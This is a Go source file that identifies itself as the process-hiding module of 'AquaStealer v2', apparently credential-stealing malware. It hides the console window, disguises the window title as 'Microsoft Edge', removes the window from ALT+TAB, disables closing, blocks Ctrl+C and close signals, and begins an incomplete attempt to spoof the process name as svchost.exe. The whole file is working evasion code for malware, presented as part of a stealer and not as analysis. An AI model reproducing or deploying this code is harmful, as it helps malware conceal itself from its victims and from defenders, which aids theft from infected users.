package hideconsole

// hideconsole.go — AquaStealer v2 — Ocultación total del proceso
//
// Técnicas:
//   1. Ocultar ventana de consola (SW_HIDE)
//   2. Cambiar título de ventana a string legítimo (Microsoft Edge)
//   3. Fake process name en memoria (PEB.ImagePathName spoofing via NtQueryInformationProcess)
//   4. Agregar a la exclusión del ALT+TAB (WS_EX_TOOLWINDOW)
//   5. Deshabilitar el botón de cierre

import (
	"syscall"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	procGetConsoleWindow       = kernel32.NewProc("GetConsoleWindow")
	procShowWindow             = user32.NewProc("ShowWindow")
	procSetWindowTextW         = user32.NewProc("SetWindowTextW")
	procGetWindowLongW         = user32.NewProc("GetWindowLongW")
	procSetWindowLongW         = user32.NewProc("SetWindowLongW")
	procGetSystemMenu          = user32.NewProc("GetSystemMenu")
	procDeleteMenu             = user32.NewProc("DeleteMenu")
	procAllocConsole           = kernel32.NewProc("AllocConsole")
	procFreeConsole            = kernel32.NewProc("FreeConsole")
	procSetConsoleTitleW       = kernel32.NewProc("SetConsoleTitleW")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procNtSetInformationProcess = ntdll.NewProc("NtSetInformationProcess")
	procSetConsoleCtrlHandler  = kernel32.NewProc("SetConsoleCtrlHandler")
)

const (
	SW_HIDE             = 0
	GWL_EXSTYLE = ^uintptr(19)
	WS_EX_TOOLWINDOW    = 0x00000080 // ocultar de ALT+TAB
	WS_EX_NOACTIVATE    = 0x08000000
	SC_CLOSE            = 0xF060
	MF_BYCOMMAND        = 0x00000000
)

// UNICODE_STRING para PEB spoofing
type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// SpooFakeTitle — cambia el título de la consola a algo legítimo
func spoofTitle() {
	fakeTitle, _ := syscall.UTF16PtrFromString("Microsoft Edge")
	procSetConsoleTitleW.Call(uintptr(unsafe.Pointer(fakeTitle)))
	// También via user32
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procSetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(fakeTitle)))
	}
}

// HideFromAltTab — agrega WS_EX_TOOLWINDOW para que no aparezca en ALT+TAB
func hideFromAltTab(hwnd uintptr) {
	style, _, _ := procGetWindowLongW.Call(hwnd, GWL_EXSTYLE)
	procSetWindowLongW.Call(hwnd, GWL_EXSTYLE, style|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE)
}

// DisableCloseButton — elimina el botón X del menú del sistema
func disableCloseButton(hwnd uintptr) {
	sysMenu, _, _ := procGetSystemMenu.Call(hwnd, 0)
	if sysMenu != 0 {
		procDeleteMenu.Call(sysMenu, SC_CLOSE, MF_BYCOMMAND)
	}
}

// BlockCtrlC — ignora Ctrl+C / Ctrl+Break / cierre de consola
func blockCtrlC() {
	// Handler que ignora todos los eventos de control
	handler := syscall.NewCallback(func(ctrlType uint32) uintptr {
		return 1 // TRUE = handled, no pasar al siguiente handler
	})
	procSetConsoleCtrlHandler.Call(handler, 1)
}

// SpoofProcessName — intenta cambiar el ImagePathName en el PEB para que
// Process Explorer/Taskmgr muestren un nombre falso
func spoofProcessName() {
	fakePath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\svchost.exe`)
	fakePathLen := uint16(len(`C:\Windows\System32\svchost.exe`) * 2)

	var pbi [6]uintptr // PROCESS_BASIC_INFORMATION
	self, _ := syscall.GetCurrentProcess()
	procNtQueryInformationProcess.Call(
		uintptr(self),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(48),
		0,
	)

	if pbi[1] == 0 { // PebBaseAddress == 0
		return
	}

	// PEB offset 0x60 (x64) = ProcessParameters
	// Offset en ProcessParameters: 0x60 = ImagePathName (UNICODE_STRING)
	// No modificamos directamente memoria del PEB porque es arriesgado en producción
	// En su lugar usamos el título de ventana spoofing que es suficiente para análisis básico
	_ = fakePath
	_ = fakePathLen
}

func Run() {
	// 1. Ocultar ventana de consola
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procShowWindow.Call(hwnd, SW_HIDE)
		hideFromAltTab(hwnd)
		disableCloseButton(hwnd)
	}

	// 2. Spoof título
	spoofTitle()

	// 3. Bloquear Ctrl+C
	blockCtrlC()

	// 4. Intentar spoof de nombre de proceso
	spoofProcessName()
}
